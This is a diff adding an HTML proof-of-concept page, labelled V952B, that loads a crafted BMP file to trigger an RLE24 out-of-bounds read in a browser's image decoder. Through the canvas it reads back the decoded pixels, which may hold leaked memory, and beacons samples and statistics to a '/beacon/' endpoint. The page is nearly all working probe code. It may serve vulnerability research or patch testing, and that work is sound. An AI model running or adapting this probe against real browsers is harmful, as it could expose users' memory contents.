@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>V952B</title></head>
+<body><pre id="out">V952B — BMP RLE24 absolute-mode mid-row OOB read (321680/e269e19, B)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  try{new Image().src='/beacon/V952B-'+tag+'?d='+encodeURIComponent(String(body).slice(0,700))+'&t='+Date.now()+'&s=1';}catch(e){}
+}
+function hx(n){ var s=n.toString(16); return s.length<2?'0'+s:s; }
+function p32(d,w,x,y){ var i=(y*w+x)*4; return hx(d[i])+hx(d[i+1])+hx(d[i+2])+hx(d[i+3]); }
+function loadImg(src){ return new Promise(function(res,rej){
+  var im=new Image();
+  im.onload=function(){res({im:im,ok:true});};
+  im.onerror=function(){res({im:im,ok:false,err:'onerror'});};
+  im.src=src+'?cb='+Date.now()+'_'+Math.random();
+});}
+async function probe(name,src){
+  bk('T-PRE',name);
+  try{
+    var r=await loadImg(src);
+    bk('LOAD',name+'|ok='+r.ok+'|nw='+r.im.naturalWidth+'|nh='+r.im.naturalHeight+'|cw='+r.im.width+'|ch='+r.im.height);
+    if(!r.ok || !r.im.naturalWidth){
+      bk('T-RES',name+'|decode-fail-or-blocked (fixed/clean-fail expected if patched)');
+      say(name+': decode/load failed (nw='+r.im.naturalWidth+')');
+      return;
+    }
+    var w=r.im.naturalWidth, h=r.im.naturalHeight;
+    var c=document.createElement('canvas'); c.width=w; c.height=h;
+    var ctx=c.getContext('2d'); ctx.clearRect(0,0,w,h);
+    try{ ctx.drawImage(r.im,0,0); }catch(e){ bk('DRAW-ERR',name+'|'+String(e&&e.message||e).slice(0,120)); return; }
+    var d=ctx.getImageData(0,0,w,h).data;
+    // sample grid
+    var samp=[];
+    var xs=[0,1,2,3,Math.floor(w/2),w-2,w-1].filter(function(x,i,a){return x>=0&&x<w&&a.indexOf(x)===i;}).sort(function(a,b){return a-b;});
+    var ys=[0,1,Math.floor(h/2),h-2,h-1].filter(function(y,i,a){return y>=0&&y<h&&a.indexOf(y)===i;}).sort(function(a,b){return a-b;});
+    for(var yi=0;yi<ys.length;yi++) for(var xi=0;xi<xs.length;xi++) samp.push(p32(d,w,xs[xi],ys[yi])+'@'+xs[xi]+','+ys[yi]);
+    bk('PX',name+'|'+w+'x'+h+'|'+samp.join('|'));
+    // variability/strangeness heuristic: count unique and nonzero patterns
+    var seen={}; for(var i=0;i+3<d.length;i+=4){ var k=hx(d[i])+hx(d[i+1])+hx(d[i+2])+hx(d[i+3]); seen[k]=(seen[k]||0)+1; }
+    var keys=Object.keys(seen); bk('STAT',name+'|uniq='+keys.length+'|top='+keys.slice(0,6).map(function(k){return k+':'+seen[k];}).join(','));
+    say(name+': '+w+'x'+h+' uniq='+keys.length);
+  }catch(e){ bk('T-ERR',name+'|'+String(e&&e.message||e).slice(0,160)); }
+}
+(async function(){
+  bk('BOOT','321680 BMP RLE24 abs run mid-row OOB read; STOP if clean-fail/crash/no readable anomalous data');
+  await probe('rle24_trunc','v952b_rle24_crash.bmp');
+  bk('DONE','complete|note=clean-fail=>patched-or-blocked; anomalous readable pixels=>candidate disclosure');
+  say('\nV952B complete.');
+})();
+</script>
+</body></html>
